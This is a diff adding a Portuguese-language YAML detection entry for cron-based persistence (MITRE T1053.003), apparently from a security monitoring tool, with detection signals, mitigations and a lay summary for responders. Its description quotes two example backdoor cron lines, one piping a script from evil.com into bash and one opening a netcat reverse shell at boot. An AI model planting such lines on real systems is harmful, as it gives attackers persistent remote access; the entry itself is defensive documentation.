@@ -1,0 +1,70 @@
+id: T1053.003
+name: Scheduled Task/Job - Cron
+tactic: Persistence (Persistência)
+url: https://attack.mitre.org/techniques/T1053/003/
+severity: high
+description: |
+  Atacante usa o cron (scheduler do Linux) pra GARANTIR que o payload
+  volta a rodar mesmo após reboot ou kill manual. Mecanismo padrão de
+  persistência em servidores comprometidos.
+
+  Locais comuns onde atacante planta:
+
+    /etc/cron.d/<nome-inocente>           # roda como qualquer user
+    /etc/cron.{hourly,daily,weekly}/      # scripts em pasta = roda no horário
+    /var/spool/cron/<user>                # crontab por user (crontab -e)
+    ~/.crontab                            # raramente usado, fácil esquecer
+    /etc/crontab                          # tabela master
+
+  Anti-padrão típico:
+
+    */5 * * * * root curl -s evil.com/x.sh | bash > /dev/null 2>&1
+    @reboot root /bin/bash -c "while true; do nc -e /bin/sh atk 4444; sleep 60; done"
+
+  O `> /dev/null 2>&1` esconde stdout/stderr — você não vê em logs.
+  `*/5` = a cada 5 min. `@reboot` = só uma vez quando bota o servidor.
+
+detection:
+  rules:
+    - yara_critical_match
+    - yara_match_burst
+  signals: |
+    YARA match com PersistenceCronBackdoor (regex casa "* * * * * curl"
+    e "@reboot bash -c"). Pode rodar manualmente em /etc/cron.d/ via
+    inventory. Em vuln-lab tem em /tmp/lab-bait/cron_backdoor (texto,
+    não em /etc pra evitar execução real).
+
+mitigation:
+  - Inventário de tudo em /etc/cron.d/, /var/spool/cron/ — diff contra baseline
+  - rkhunter detecta cron entries suspeitas em audit periódico
+  - AIDE com /etc/cron.d/ na lista de monitored paths
+  - Permissões: /etc/cron.d/ deve ser 755 root:root, arquivos 644
+  - Auditd: watch em /etc/cron.d/ pra ver criação/modificação em tempo real
+  - SELinux: contexto sysadm_t pro crond restringe o que job pode fazer
+
+references:
+  - https://attack.mitre.org/techniques/T1053/003/
+  - https://man7.org/linux/man-pages/man5/crontab.5.html
+
+summary_simple:
+  what_happened: |
+    Encontramos um JOB AGENDADO suspeito que parece estar configurado
+    pra rodar um comando do atacante periodicamente (a cada X minutos)
+    ou no boot da máquina. É a forma clássica de garantir que o
+    backdoor "volte sozinho" mesmo se você matá-lo.
+  should_worry: |
+    Bem sério. Persistência via cron raramente é acidental — quase sempre
+    significa que alguém invadiu, deixou esse "lembrete" pra reabrir
+    acesso, e foi embora pensando em voltar depois. O ataque inicial
+    pode ter sido dias ou semanas atrás.
+  what_to_do:
+    - "Liste todos os jobs: cat /etc/crontab /etc/cron.d/* && for u in $(cut -f1 -d: /etc/passwd); do crontab -u $u -l 2>/dev/null; done"
+    - "Apague o arquivo suspeito: sudo rm /etc/cron.d/<nome-suspeito>"
+    - "Veja /var/log/syslog ou journalctl -u cron pra entender desde quando rodou"
+    - "Cheque outros backdoors: webshell, reverse shell em /tmp, processos estranhos"
+    - "Considere reinstalar o servidor (atacante pode ter outros backdoors)"
+    - "Troque chaves SSH e senhas — não dá pra confiar no servidor invadido"
+  jargon:
+    cron: "Scheduler do Linux que roda comandos em horários definidos. Útil pra backups, mas atacantes adoram porque garante persistência"
+    persistência: "Técnica do atacante pra GARANTIR que o malware volta a rodar mesmo se você reiniciar a máquina ou matar o processo"
+    "@reboot": "Diretiva do cron que roda o comando uma vez quando a máquina boota. Atacantes usam pra reativar reverse shells automaticamente"
